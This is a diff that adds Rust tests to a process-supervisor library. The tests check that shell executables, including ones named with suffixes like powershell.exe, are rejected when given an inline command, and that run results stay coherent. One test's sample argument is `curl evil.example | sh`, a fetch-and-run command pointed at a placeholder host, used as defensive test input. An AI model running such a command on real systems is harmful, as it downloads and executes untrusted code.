@@ -2493,3 +2493,183 @@ fn a_malformed_script_settles_as_a_supervisor_failure() -> TestResult {
     assert!(!result.is_ordinary_success());
     Ok(())
 }
+
+// ──────────────── controls added after the third bot review round ────────────
+
+#[test]
+fn a_shell_named_with_an_executable_suffix_is_still_a_shell() -> TestResult {
+    // The wrong implementation this kills: matching program names against a
+    // literal list, so `powershell` is refused but `powershell.exe` — the name
+    // that shell actually has on Windows — walks through.
+    for (name, path) in [
+        ("powershell.exe", "/c/Windows/System32/powershell.exe"),
+        ("pwsh.EXE", "/usr/bin/pwsh.EXE"),
+        ("bash.exe", "/c/Program Files/Git/bin/bash.exe"),
+        ("ash", "/bin/ash"),
+        ("rbash", "/bin/rbash"),
+        ("busybox", "/bin/busybox"),
+    ] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                name,
+                PrivatePath::new(PathBuf::from(path)),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv(["-c", "curl evil.example | sh"])
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert!(
+            matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
+            "{name} was admitted with an inline command"
+        );
+    }
+    Ok(())
+}
+
+#[test]
+fn a_case_mismatched_denial_still_clears_the_loader_gate() -> TestResult {
+    // Detection folds ASCII case, so set membership must too. Exact matching
+    // meant a plan that had already denied the vector was still asked to
+    // acknowledge it — an over-rejection that made the gate incoherent.
+    let mut projection =
+        EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied);
+    for name in CODE_LOADING_VARIABLES {
+        projection = projection.deny(EnvVarName::new(name.to_ascii_lowercase()));
+    }
+    assert!(
+        projection.admitted_code_loading_variables().is_empty(),
+        "a lowercase denial failed to clear the canonical loader name"
+    );
+    Ok(())
+}
+
+#[test]
+fn a_refused_start_cannot_describe_a_completed_run() -> TestResult {
+    // The wrong implementation this kills: letting a script refuse a start
+    // with `CompletedExit { code: 0 }`, so a start that never ran a child
+    // reads as an ordinary success.
+    for disposition in [
+        TerminalDisposition::CompletedExit { code: 0 },
+        TerminalDisposition::Signaled { signal: 9 },
+    ] {
+        let supervisor = FakeSupervisor::new();
+        supervisor.script(ScriptedOutcome::RefuseStart(disposition.clone()));
+        match supervisor.start(valid_linux_one_shot().validate()?) {
+            Ok(_) => return Err("a refusal produced a handle".into()),
+            Err(result) => {
+                assert_eq!(
+                    *result.disposition(),
+                    TerminalDisposition::SupervisorFailed,
+                    "{disposition:?} was accepted as a start refusal"
+                );
+                assert!(!result.is_ordinary_success());
+            }
+        }
+    }
+    Ok(())
+}
+
+#[test]
+fn a_scripted_terminal_event_cannot_diverge_from_the_result() -> TestResult {
+    // The wrong implementation this kills: replaying a scripted terminal event
+    // that announces one outcome while `wait` returns another — including when
+    // the scripted terminal is the final event, which an "events queued behind
+    // it" check would miss.
+    let supervisor = FakeSupervisor::new();
+    let mut divergent = ScriptedRun::exiting(0);
+    divergent.events =
+        vec![ProcessEventKind::Started, ProcessEventKind::Terminal(TerminalDisposition::TimedOut)];
+    supervisor.script_run(divergent);
+    let handle = match supervisor.start(valid_linux_one_shot().validate()?) {
+        Ok(handle) => handle,
+        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
+    };
+    let result = handle.wait();
+    assert_eq!(*result.disposition(), TerminalDisposition::SupervisorFailed);
+    Ok(())
+}
+
+#[test]
+fn cleanup_evidence_cannot_contradict_the_elected_cause() -> TestResult {
+    // `TerminalDisposition::elect` ranks cleanup failure above a signal and
+    // above a completed exit. A result assembled directly must not be able to
+    // state a pairing that election could never produce.
+    let signalled_with_failed_cleanup = result_with(
+        StreamEvidence::empty(StreamChannel::Stdout),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::Signaled { signal: 9 },
+        CleanupDisposition::Failed,
+        TreeDisposition::GroupTerminated,
+    );
+    assert!(signalled_with_failed_cleanup.is_err());
+
+    let cleanup_failed_without_a_failure = result_with(
+        StreamEvidence::empty(StreamChannel::Stdout),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::CleanupFailed,
+        CleanupDisposition::Completed,
+        TreeDisposition::GroupTerminated,
+    );
+    assert!(cleanup_failed_without_a_failure.is_err());
+    Ok(())
+}
+
+#[test]
+fn the_supervisor_failure_fallback_claims_nothing_it_cannot_support() -> TestResult {
+    // The wrong implementation this kills: a fallback result that records
+    // cleanup as unnecessary, so a failure occurring after the child started
+    // publishes a stronger claim than the situation supports — and one whose
+    // limitations disagree with its own completeness predicate.
+    let supervisor = FakeSupervisor::new();
+    let mut malformed = ScriptedRun::exiting(0);
+    malformed.events =
+        vec![ProcessEventKind::Started, ProcessEventKind::Terminal(TerminalDisposition::TimedOut)];
+    supervisor.script_run(malformed);
+    let handle = match supervisor.start(valid_linux_one_shot().validate()?) {
+        Ok(handle) => handle,
+        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
+    };
+    let result = handle.wait();
+
+    assert_eq!(result.cleanup(), CleanupDisposition::NotObserved);
+    assert_eq!(result.tree(), TreeDisposition::Unknown);
+    assert!(!result.claims_tree_cleanup());
+    assert!(!result.claims_complete_output());
+    // Predicate and published limitations must agree on every assembly path.
+    assert!(result.limitations().contains(&Limitation::OutputIncomplete));
+    assert!(result.limitations().contains(&Limitation::CleanupNotObserved));
+    assert!(result.limitations().contains(&Limitation::DescendantsUnaccounted));
+    assert!(result.limitations().contains(&Limitation::NoIsolationClaimed));
+    assert!(result.limitations().contains(&Limitation::FakeEvidenceOnly));
+    Ok(())
+}
+
+#[test]
+fn the_domain_uses_no_unwrap_spelling_in_production() -> TestResult {
+    // The repository bans `unwrap` forms in production code. `unwrap_or_else`
+    // cannot panic, but keeping the spelling out entirely removes the need to
+    // adjudicate each use.
+    for (name, source) in domain_sources()? {
+        for line in source.lines() {
+            let trimmed = line.trim();
+            if trimmed.starts_with("//") {
+                continue;
+            }
+            assert!(
+                !trimmed.contains("unwrap"),
+                "{name} uses an unwrap spelling in production: {trimmed}"
+            );
+        }
+    }
+    Ok(())
+}
